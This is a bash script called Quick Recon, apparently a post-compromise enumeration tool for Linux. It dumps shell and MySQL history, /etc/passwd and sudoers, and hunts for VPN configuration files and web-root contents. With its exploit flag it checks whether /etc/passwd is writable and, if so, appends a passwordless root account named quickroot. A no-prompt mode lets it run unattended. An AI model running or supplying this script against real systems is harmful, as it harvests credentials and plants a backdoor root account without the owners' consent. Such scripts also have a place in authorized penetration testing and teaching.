#!/bin/bash

#	Quick Recon
#	
#	Basic recon script for linux-based systems. Checks for standard files, permissions, etc.
#	Has some BASIC privilege escalation attempts but is primarily recon.
#

bhist_PATH=~/.bash_history 
msqlhist_PATH=~/.mysql_history
run_exploits=false
verbose_print=false
yes_prompts=false

printf "\n"
echo "-------------------------------------------------------------------------"
echo "                               QUICK-RECON                               "
echo "-------------------------------------------------------------------------"
printf "\n"

while getopts ":evhc" opt; do
	case $opt in
		e)
			echo "FLAG: Exploits enabled"
			run_exploits=true
			;;
		v)
			echo "FLAG: Verbose printing enabled"
			verbose_print=true
			;;
		h)
			echo "Usage: ./quickrecon.sh [FLAGS]"
			echo "FLAGS:"
			echo "    -h    This help"
			echo "    -v    Enable verbose printing and logging (prints contents of files)"
			echo "    -e    Enable the use of basic exploits and injections"
			echo "    -c    Continue past all prompts and don't ask for any user input (useful for script piping)"
			echo ""
			echo "EXAMPLES:"
			echo "    ./quickrecon.sh -cev | tee qr_results.txt | grep -E 'CHECK|EXPLOIT'"
			echo "    ./quickrecon.sh -ce"
			echo ""
			exit 1
			;;
		c)
			echo "FLAG: Continue: Disasble all prompts for user input"
			yes_prompts=true
			;;
		\?)
			echo "Invalid option: -$OPTARG"
			exit 1
			;;
	esac
done
printf "\n"

# -----------------------------------------------------------------------
# Start of basic system recon
# -----------------------------------------------------------------------

printf '\e[1;34m%-6s\e[m\n' "[CHECK] System Data..."

printf "uname -a:\n"
uname -a

if [ "$verbose_print" == true ]; then
	printf "\ndf -a:\n"
	df -a
fi

printf "\nwhoami:\n"
whoami

printf "\nfinger:\n"
finger

printf "\nw:\n"
w

printf "\n\n"

# -----------------------------------------------------------------------
# Check for bash_history
# -----------------------------------------------------------------------

printf '\e[1;34m%-6s\e[m\n' "[CHECK] Checking for $bhist_PATH"
if [ ! -f $bhist_PATH ]; then
	printf "$bhist_PATH not found.\n";
	printf "Trying locate...\n"
	locate .bash_history
else
	printf "File found\n";
	if [ "$verbose_print" == true ]; then
		cat $bhist_PATH
	fi
fi
printf "\n\n"


# -----------------------------------------------------------------------
# Check for mysql_history
# -----------------------------------------------------------------------

printf '\e[1;34m%-6s\e[m\n' "[CHECK] Checking for $msqlhist_PATH"
if [ ! -f $msqlhist_PATH ]; then
	printf "$msqlhist_PATH not found.\n"
	printf "Trying locate...\n"
	locate .mysql_history
else
	printf "File found\n"
	if [ "$verbose_print" == true ]; then
		cat $msqlhist_PATH
	fi
fi
printf "\n\n"


# -----------------------------------------------------------------------
# Check and dump /etc/passwd
# -----------------------------------------------------------------------

printf '\e[1;34m%-6s\e[m\n' "[CHECK] Checking for /etc/passwd"
if [ ! -f /etc/passwd ]; then
	printf "Could not find file. Trying locate...\n"
	locate passwd
else
	printf "File found\n"

	if [ "$verbose_print" == true ]; then
		cat /etc/passwd
	fi

	if [ "$run_exploits" == true ]; then
		printf "\n\n"
		printf '\e[1;31m%-6s\e[m' "Run-Exploits is on... Checking permissions on /etc/passwd..."
		printf "\n"
		ls -al /etc/passwd
		if [ -w /etc/passwd ]; then
			printf "/etc/passwd is writable by this user.\n"
			printf "Attempting to inject passwordless root user with username quickroot...\n"
			echo "quickroot::0:0:quickroot:/root:/bin/bash" >> /etc/passwd
			printf '\e[1;32m%-6s\e[m' "[EXPLOIT] Attempt complete. Try: su quickroot"
			printf "\n"
			if [ ! "$yes_prompts" == true ]; then 
				printf "Press any key to continue...\n"
				read usr_input
			fi
		else
			printf "\t/etc/passwd is NOT writable -- Can't inject root user.\n"
		fi
	fi
fi

printf "\n\n"


# -----------------------------------------------------------------------
# Check and dump sudoers
# -----------------------------------------------------------------------

printf '\e[1;34m%-6s\e[m\n' "[CHECK] Checking for sudoers"
if [ ! -f /etc/sudoers ]; then
	printf "Could not find file. Trying locate...\n"
	locate sudoers
else
	printf "File found\n"

	if [ "$verbose_print" == true ]; then
		cat /etc/sudoers
	fi
fi
printf "\n\n"

printf '\e[1;34m%-6s\e[m\n' "[CHECK] Listing /etc/sudoers.d/"
ls -al /etc/sudoers.d/
printf "\n\n"


# -----------------------------------------------------------------------
# Search for files of note...
# -----------------------------------------------------------------------


printf '\e[1;34m%-6s\e[m\n' "[CHECK] Looking for .ovpn files..."
locate *.ovpn

printf "\n\n"

printf '\e[1;34m%-6s\e[m\n' "[CHECK] Listing files in /var/www/html..."
ls -al /var/www/html

printf "\n\n"

# -----------------------------------------------------------------------
#
# -----------------------------------------------------------------------






















